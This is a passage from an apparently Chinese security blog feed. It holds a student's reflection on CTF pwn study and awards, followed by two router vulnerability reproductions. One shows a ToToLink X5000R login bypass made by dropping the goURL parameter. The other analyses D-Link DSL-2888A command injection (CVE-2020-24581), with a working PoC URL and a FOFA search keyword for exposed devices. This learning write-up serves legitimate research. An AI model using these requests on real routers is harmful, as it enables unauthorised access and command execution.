高三才开始认真学 如果早点学我可以去更好的学校 这样的借口来麻痹自己 给予自己我很聪明的假象 所以 我打算从一开始就认真一次 我想看看自己的极限在哪里 如果我努力到了在本校前列 我就和同样是双非的比较 如果我到了这一层次的前列 我就继续向上看齐 我想看看自己的极限在哪里</p><p>这种对于自己高考成绩的不甘心 以及萌生的对于钱的认知 我下定决心 在大学的期间 我的努力要让我赚到钱 在当时的我看来 一个人的出息与否 等同于他能赚到的钱</p><p>浅薄的认知告诉我 进大厂&#x3D;赚大钱 而双非本科的学历属实是不够看 所以提升简历 就放在了第一位 由此想到了通过竞赛来提升简历 这也是最开始 一加到新生群 就询问acm相关的事项(当时哪里知道还有个ctf</p><p>大概是在本校的oj刷了七十多道题吧  专业最后也是知晓了 网络空间安全 一开始选择这个专业呢 一方面是当时报考的想到传统的程序员的竞争压力会不会过大 所以选择了另外一条赛道 其实这种避开卷的赛道思想也出现在高二选择了物化地上面</p><p>总之 了解了过后 才知道acm对于网络空间安全的帮助没有那么大 同时两个比赛一起打 如果不是天才的话 只会两个水平都一般 所以最后是选择了打ctf</p><h2 id="为什么走pwn方向"><a href="#为什么走pwn方向" class="headerlink" title="为什么走pwn方向"></a>为什么走pwn方向</h2><p>一方面呢也是因为我想避开竞争压力大的赛道 也就是选择的人多的web方向</p><p>一方面也是实际做题下来 发现其他方向用到的工具太多了 知识点也很繁杂 而且做出题的思路我不是很喜欢</p><p>总感觉是偏向于脑洞 相比较 pwn的对于漏洞思想的考察 我就很喜欢这种节奏 在学习起效了以后 经常会自发性的研究漏洞 自己鼓捣一些利用方式</p><h2 id="学习途中帮助很大的人！"><a href="#学习途中帮助很大的人！" class="headerlink" title="学习途中帮助很大的人！"></a>学习途中帮助很大的人！</h2><p>第一位启蒙导师 应该要属本校的acm学长 阿凌 也是最开始acm猛刷七十多道题的时候认识的 由于涉及个人隐私 这里不方便说他的经历  但是他背水一战的经历 在直到现在的很多时候 都能给予我坚持的动力应该来说 对于大学四年的安排 是他第一个给了我大概的规划 因为是家中三代第一个大学生 对于大学是一个什么样的存在 其实不是很清楚 然后对于就业的一些浅薄的认知 也是听闻他</p><p>第二位 当属在高三暑假学习pwn中认识的外校学长 幽林师傅 时至今日 一些解决不了的问题 也是经常请教 特别是在学习的初期阶段 很多弱智问题 幽林师傅都耐心的解答了 特表感激！</p><p>第三位 也是帮助最大的一位 外校的xiaobin学长 应该是九月初认识的 当初是因为询问本校的历年校赛 是他出的 从而有了联系 最后靠xiaobin师傅的提拔和器重 也是有了很多机会 间接和本校的学长熟络了 也认识了很多外校厉害的学长 可以说是开阔了视野 同时也十分感激有一晚的手把手教学动态调试 到现在 每次做题 也是最喜欢动态调试的过程 有一种自己发掘到程序的最底层原理的快感</p><p>第四位 应该属本校的各位学长 引导了初期对于ctf赛事的认知 以及未来就业或者是读研的情况  更是带着我这个饭桶 一路杀到了国赛总决赛！直接开始可汗大点兵(排名不分先后 邵学长 李学长  林学长 陈学长 谢学长等等 以及协会的所有学长学姐！</p><p>第五位 留给在学习途中 给予我各种各样帮助的师傅! 没有他们的帮助就没有现在的我(草 说的跟获奖感言一样 不过是发自肺腑的</p><h2 id="大一的CTF总结"><a href="#大一的CTF总结" class="headerlink" title="大一的CTF总结"></a>大一的CTF总结</h2><p>对于我一个零基础 在大学前 接触电脑只有玩过minecraft和4399的来说 上来就是从二进制方向入门 属实够呛 对于什么虚拟地址啊 寄存器啊都是一头雾水 大一上学期的学习只能说是一塌糊涂 学习的进度非常缓慢 应该是停留在模板化的利用栈以及低版本的堆</p><p>对于漏洞的利用灵活起来 应该是在西湖论剑 也是第一场有输出的大赛 其前两题都是关于栈的灵活应用 在赛后复现完并且吃透了以后 对于栈的利用帮助非常大 也是自那以后 开始萌生了对于漏洞利用的思考 </p><p>到了大一下学期 由于本校的陈学长推荐 面试了联合战队vn 也是属于ctf生涯中比较大的一个转折点 从原本的圈子中跳了出来 认识到了原来还有这么多厉害的人 意识到了和他们之间的差距 一直都是我向上努力追赶的动力 同时由于vn战队和安恒有出题方面的合作 因此我赚到了大学的第一桶金</p><p>随后就是比较重要的两场比赛吧 福建省的省赛黑盾杯 以及国赛CISCN 前者呢 是一直听xiaobin学长说已经两年pwn零解了 所以对于当时的我来说 如果打破了这个诅咒 就是我厉害的地方了哈哈(还记得在最初版的博客里有一句话 打破不可能 说的就是这个  也是非常没有辜负自己的期望 在今年的黑盾杯复赛 成功拿下了pwn题目的一血！ </p><p>国赛CISCN 也是一路打到了决赛 最后拿下了全国三等奖 不过这个比赛更多靠的是学长的带飞 这里就不邀功了233 一笔带过</p><p>其他的小比赛呢 更多的是其他学校的举报的校赛或者是联合战队举办的比赛 这里做个大概的总结吧</p><p><strong>1.ISCTF2022 新生赛道一等奖(laffey✌带飞的 我是混逼)</strong></p><p><strong>2.skynico2022 总榜第七 二等奖(个人赛 虽然我感觉也很水)</strong></p><p><strong>3.GDOUCTF2023 外校赛道第五名 三等奖(跟着vn的师傅打的 我是混逼)</strong></p><p><strong>4.NISA2023 总榜第二 一等奖 (师大自己办的校赛 运气好)</strong></p><p><strong>5.NEEPUCTF2023 外校赛道第八名 三等奖(个人赛 打的师傅比较少 捡漏233)</strong></p><p><strong>6.LITCTF2023 外校赛道第七名 二等还是三等来着忘了 (跟着vn的师傅打的 我是混逼)</strong></p><p><strong>7.CISCN2023 华东南分区赛一等奖(学长带飞 不过我有点输出 欸嘿 特别是抢了一题一血 因为那题简直就是我的出题方式低配版)</strong></p><p><strong>8.CISCN2023 总决赛三等奖 （别说了 恰保底 而且更多的锅在我身上 是真爆零了 题目策略的问题 第二天复现的时候一小时就把一题做出来的 如果我出了说不定就不用恰保底了 草）</strong></p><p><strong>9.NepNepctf2023 总榜19名 三等奖(分值设置的比较不合理 运气好捡漏)</strong></p><p><strong>10.ISCC2023 三等奖 (草 写这个单纯为了凑到十个好看点 写出来的时候我都笑了 什么鸡儿奖项)</strong></p><h2 id="对于未来的规划"><a href="#对于未来的规划" class="headerlink" title="对于未来的规划"></a>对于未来的规划</h2><p>一年下来呢 目前的水平其实比较尴尬 跟金字塔尖的大佬差的实在有点多 不上不下 不过由于今年跟着学长混了个国三 我个人认为ctf这块对于简历的帮助已经差不多了 未来不会再花太多精力在这上面 应该是算半退役 未来更多的时间呢 我希望学好英语 不单单是为了过四六级 也是对于更远的未来的一种保底的打算 以及学好iot方向 这是我在众多二进制就业方向中选择的一个比较感兴趣的方向 希望能在大二时挖到第一个CVE!</p><p>然后就是十分笼统的对于性格方面的期待啦 希望自己一直保持向上看齐的乐观心态 时刻对自己的菜狗水平有认知 不骄不躁的完成既定的目标</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>洋洋洒洒的写了三千多字 废话也是比较多 关于人生的思考 我也是明白一点了 正应罗翔老师说过的 人生就像是一场电影 我们没有办法决定我们的剧本 我们的出生 我们的智商等等 但是哪怕你手里的牌再差 也只能尽力去打</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="something to say" scheme="http://example.com/categories/something-to-say/"/>
    
    
  </entry>
  
  <entry>
    <title>ToToLink-X5000R登录绕过</title>
    <link href="http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/08/15/ToToLink-X5000R%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87/</id>
    <published>2023-08-15T10:26:41.000Z</published>
    <updated>2023-09-14T17:21:03.291Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着看雪上的这位师傅复现的 <a href="https://www.kanxue.com/chm.htm?id=17830">https://www.kanxue.com/chm.htm?id=17830</a> </p><p>好文章 学到了面对一个路由器时的分析思路</p><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>固件下载地址<a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&amp;id=65</a></p><p>mipsel架构  模拟脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>模拟起来后 进入其中配置eth0网络接口与top0位于同一c段</p><p>随后打包squashfs-root文件夹 通过scp上传到模拟系统中</p><p>以squashfs-root文件夹为根目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure><p>随后启动路由器服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" title="image-20230815184214754" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151842851.png" alt="image-20230815184214754"></a></p><p>会因为找不到文件而报错 </p><p>直接在对应目录下创建一个空文件就可以了</p><p>成功启动服务</p><h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>首先我们要清楚 我们要从哪个方向来分析这个路由器  这一点是至关重要的 不能漫无目的</p><p>我们选择针对登录这一点来分析 首先试着随便输入密码 并且通过抓包来查看登录检测涉及到了哪些文件</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" title="image-20230815184817104" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848154.png" alt="image-20230815184817104"></a></p><p>可以看到 密码的发送是通过这个包来进行的</p><p>同时你可以注意到状态是302 这意味着服务器返回了重定向响应 来看一下跳转的地址是什么</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" title="image-20230815184849802" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151848830.png" alt="image-20230815184849802"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm？authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=1</span><br></pre></td></tr></table></figure><p>有着比较多的参数 应该是用来判断用户的密码是否正确 我们找到这个包对应的cgi文件</p><p>搜索username字符串 尝试找到对应的代码</p><p>发现了sub_42A2D0函数 其功能似乎是根据其他参数来决定重定向的网址 来看下面的代码</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" title="image-20230815193100787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151931810.png" alt="image-20230815193100787"></a></p><p>根据v9来判断重定向的网址 这里猜测应该是flag这个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.6.1/formLoginAuth.htm?authCode=0&amp;userName=&amp;goURL=phone/login.html&amp;action=login&amp;flag=ie8</span><br></pre></td></tr></table></figure><p>通过单独修改flag为ie8 最后成功重定向到了login_ie.html 证实了猜想 但是好像没有什么软用</p><p>接下来想的是为www目录下找到formLoginAuth.htm这个网址 但是好像没有 那么就去lighttpd这个文件来看看</p><p>可以看到 根据不同的网址来进入不同的函数 我们来跟进到form_login函数中</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" title="image-20230815193537526" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151935557.png" alt="image-20230815193537526"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    fbss = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v13 = time(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !ws_get_cookie(a1, <span class="string">&quot;SESSION_ID&quot;</span>, v16, <span class="number">0</span>) &amp;&amp; form_get_idx_by_sessionid(&amp;fl_sess, v13, v16) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(v15, <span class="string">&quot;%ld:%d&quot;</span>, v13, <span class="number">2</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(v19, <span class="string">&quot;%d:%s&quot;</span>, <span class="number">2</span>, v15);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( form_get_idx_by_sessionid(&amp;fl_sess, v13, v19) != <span class="number">-1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      v6 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( form_add_session(&amp;fl_sess, &amp;fl_sess_bak, <span class="number">-1</span>, v17, v6, v19, <span class="number">2</span>, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      ws_set_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, v19, <span class="number">0</span>, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s/%s?timestamp=%ld&quot;</span>, v23, v20, v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ws_clear_cookie(a3, <span class="string">&quot;SESSION_ID&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    fbss = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v14, <span class="string">&quot;ie8&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login_ie.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(&amp;v14) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s%s&quot;</span>, v23, <span class="string">&quot;/phone&quot;</span>, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sprintf</span>(a2, <span class="string">&quot;http://%s%s&quot;</span>, v23, <span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到对于v8的值进行了判断 如果不为0则进入if分支 可以看到对于a2进行了操作 </p><p>而我们看到下面 a2应该是重定向的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" title="image-20230815194828730" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151948757.png" alt="image-20230815194828730"></a></p><p>那么v8的值怎么来的呢  可以看到应该是跟authcode的参数有关系 那么我们将authcode修改为1后试试</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" title="image-20230815194901122" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151949150.png" alt="image-20230815194901122"></a></p><p>结果发现还是跳转回到login.html页面  但是参数确实多了个timestamp</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" title="image-20230815195043221" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151950240.png" alt="image-20230815195043221"></a></p><p>这里应该是由于我们重定向导致的 但是将flag删除掉 也没有办法 因为会进入最后的else分支 默认重定向到&#x2F;login.html</p><p>但是我们仔细观察一下参数 还是有一个叫做goURL的 我们把这个参数删除掉后</p><p>成功绕过了登录 进入了后台</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" title="image-20230815195258957" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308151952062.png" alt="image-20230815195258957"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2020-24581</title>
    <link href="http://example.com/2023/08/09/CVE-2020-24581/"/>
    <id>http://example.com/2023/08/09/CVE-2020-24581/</id>
    <published>2023-08-09T11:51:32.000Z</published>
    <updated>2023-09-14T17:18:53.765Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参照资料<a href="https://www.anquanke.com/post/id/229323#h3-5">https://www.anquanke.com/post/id/229323#h3-5</a></p><p>比较简单的一个CVE 且不需要模拟路由器环境 适合第一次接触iot的萌新(就比如我</p><p>同时由于我的网络基础知识薄弱 有些地方也是网络上查资料的 可能存在错误</p><p><strong>漏洞路由器型号:D-Link DSL-2888A</strong></p><p><strong>漏洞编号: CVE-2020-24581</strong></p><p><strong>fofa搜索关键词: body&#x3D;DSL-2888A</strong></p><p><strong>漏洞影响版本:  AU_2.31_V1.1.47ae55之前的版本</strong></p><p><strong>固件下载: <a href="https://www.dlink.com.sg/dsl-2888a/">https://www.dlink.com.sg/dsl-2888a/</a></strong></p><h1 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h1><p>首先要清楚 漏洞产生的原因是因为execute_cmd.cgi文件存在任意的参数执行</p><p>为了捋清楚漏洞的本质 我们要定位到以下两个重点</p><p><strong>1.如何执行到execute_cmd.cgi文件</strong></p><p><strong>2.如何赋值execute_cmd.cgi的参数</strong></p><h2 id="如何执行到execute-cmd-cgi文件"><a href="#如何执行到execute-cmd-cgi文件" class="headerlink" title="如何执行到execute_cmd.cgi文件"></a>如何执行到execute_cmd.cgi文件</h2><p>&#x2F;etc&#x2F;rc.d&#x2F;rcS是Linux系统中负责系统初始化以及启动相关任务的脚本</p><p>本次漏洞是由web服务触发的 所以我们需要跟进到路由器负责web服务的二进制文件 通过&#x2F;etc&#x2F;rc.d&#x2F;rcS脚本 可以定位到是dhttpd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if [ -e &quot;/usr/sbin/onetouch&quot; ]; then</span><br><span class="line">dxml -n dbros -t &amp;</span><br><span class="line">sleep 1</span><br><span class="line">dxmlc -l /usr/script/onetouch/dlink.xml</span><br><span class="line">sleep 1</span><br><span class="line">/usr/script/onetouch/sync_device.sh</span><br><span class="line">/usr/script/onetouch/sync_wan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan.sh</span><br><span class="line">/usr/script/onetouch/sync_wlan5g.sh</span><br><span class="line"></span><br><span class="line">dhttpd &amp;</span><br><span class="line">killall onetouch</span><br><span class="line">onetouch &amp;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>通过find命令 可以定位到位于&#x2F;usr&#x2F;sbin&#x2F;dhttpd目录<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092019177.png" alt="image.png"></a><br>发现是32位的ARM架构的文件<br>随后我们需要定位到dhttp文件中负责调用execute_cmd.cgi文件的函数<br>先来搞明白cgi文件是什么 CGI (Common Gateway Interface) 文件是一种通用的网页编程技术 用于在Web服务器上执行可执行程序或脚本<br>其存放在jffs2-root&#x2F;www&#x2F;cgi-bin&#x2F;目录下<br>所以我们尝试在ida中搜索cgi-bin字符串 就可以跟着定位到sub_9C4C函数<br>该函数用来加载web和cgi组件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092106592.png" alt="image.png"></a><br>我们可以进一步跟进到sub_BEA0函数<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092101331.png" alt="image.png"></a><br>这里进行调用cgi文件前的相关check和初始化<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092102855.png" alt="image.png"></a><br>在后面可以看到 需要相关的环境变量来启动cgi文件<br>可以看到有REMOTE_USER的变量 说明可能需要<br>随后调用了sub_BB5C函数执行cgi文件</p><h2 id="如何赋值execute-cmd-cgi的参数"><a href="#如何赋值execute-cmd-cgi的参数" class="headerlink" title="如何赋值execute_cmd.cgi的参数"></a>如何赋值execute_cmd.cgi的参数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">. /usr/syscfg/api_log.sh</span><br><span class="line">cmd=`echo $&#123;QUERY_STRING&#125; | cut -d = -f 3` </span><br><span class="line">cmd=`echo $&#123;cmd&#125; |tr &quot;%20&quot; &quot; &quot;` </span><br><span class="line">result=`$&#123;cmd&#125;`  </span><br><span class="line">TGP_Log $&#123;TGP_LOG_WARNING&#125; &quot;cmd=$&#123;cmd&#125;, result=$&#123;result&#125;&quot;</span><br><span class="line">echo  &quot;Content-type: text/html&quot;</span><br><span class="line">echo  &quot;&quot;</span><br><span class="line">echo -n $&#123;result&#125;</span><br></pre></td></tr></table></figure><p>通过分析其内容 可以看到cmd参数是根据QUERY_STRING环境变量的第三个字段来的 其分割符是‘&#x3D;’<br>那么我们此时来遍历一下目录下的所有文件 看看QUERY_STRING环境变量的内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_files</span>(<span class="params">directory, target_string</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            filepath = os.path.join(root, file)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                line_number = <span class="number">1</span></span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                    <span class="keyword">if</span> target_string.lower() <span class="keyword">in</span> line.lower():</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Found in file: <span class="subst">&#123;filepath&#125;</span>, line: <span class="subst">&#123;line_number&#125;</span>, content: <span class="subst">&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">                    line_number += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要搜索的目录和目标字符串</span></span><br><span class="line">search_directory = <span class="string">&#x27;/home/chen/iot/_DSL-2888A_AU_2.12_V1.1.47Z1-Image-all.bin.extracted/jffs2-root&#x27;</span></span><br><span class="line">target_string = <span class="string">&#x27;QUERYSTRING&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行批量搜索</span></span><br><span class="line">search_files(search_directory, target_string)</span><br></pre></td></tr></table></figure><p>这里搜索QUERY_STRING没有找到有用的文件 所以去掉了_</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" title="image-20230809214437721" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092144787.png" alt="image-20230809214437721"></a></p><p>于是我们可以定位到ajax.js文件</p><p>通过观察POC我们可以知道 是通过GET请求 很快可以定位到对应的代码</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">get <span class="punctuation">:</span> function(_dataType)</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        var _url = this.url;</span><br><span class="line">        if(_url.indexOf(&#x27;?&#x27;) == <span class="number">-1</span>)</span><br><span class="line">            _url += &#x27;?timestamp=&#x27; + new Date().getTime();</span><br><span class="line">        else</span><br><span class="line">            _url += <span class="string">&quot;&amp;timestamp=&quot;</span> + new Date().getTime();</span><br><span class="line">        if(this.queryString.length &gt; <span class="number">0</span>)</span><br><span class="line">            _url += <span class="string">&quot;&amp;&quot;</span> + this.queryString;</span><br><span class="line"></span><br><span class="line">        this.xmlHttp.open(<span class="string">&quot;GET&quot;</span><span class="punctuation">,</span> _url<span class="punctuation">,</span> <span class="literal"><span class="keyword">true</span></span>);</span><br><span class="line">        <span class="comment">/* will make IE11 fail.</span></span><br><span class="line"><span class="comment">        if(!document.all)&#123;</span></span><br><span class="line"><span class="comment">            if(_dataType == &quot;xml&quot;)</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/xml;charset=utf8&quot;);</span></span><br><span class="line"><span class="comment">            else</span></span><br><span class="line"><span class="comment">                this.xmlHttp.overrideMimeType(&quot;text/html;charset=gb2312&quot;);//设定以gb2312编码识别数据  </span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        this.xmlHttp.send(<span class="literal"><span class="keyword">null</span></span>);</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>不难看出其会在url后加上一个参数timestamp 用来记录当前的时间戳 随后拼接完url后发送</p><p>我个人认为这一步分析其实没有什么必要 因为在审计完execute_cmd.cgi后我们就可以得到POC如何编写了</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>加上刚才分析的 cmd参数是由第三个字段来的 也就是第二个参数 那么可以直接得到POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx/cgi-bin/execute_cmd.cgi?aaaa=6&amp;bbbb=ls</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" title="image-20230809215418504" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202308092154559.png" alt="image-20230809215418504"></a></p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在dhttpd文件的分析中 可以看到要成功执行cgi文件还需要先进行登录验证</p><p>所以我们需要搭配上CVE-2020-24579才能成功复现该漏洞</p><p>这里就不进行讲解</p><p><a href="https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/">https://vuls.info/PeiQi/wiki/iot/D-Link/D-Link%20DSL-28881A%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20CVE-2020-24579/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>qemu搭建路由器虚拟环境</title>
    <link href="http://example.com/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <id>http://example.com/2023/08/09/qemu%E6%90%AD%E5%BB%BA%E8%B7%AF%E7%94%B1%E5%99%A8%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</id>
    <published>2023-08-09T00:01:57.000Z</published>
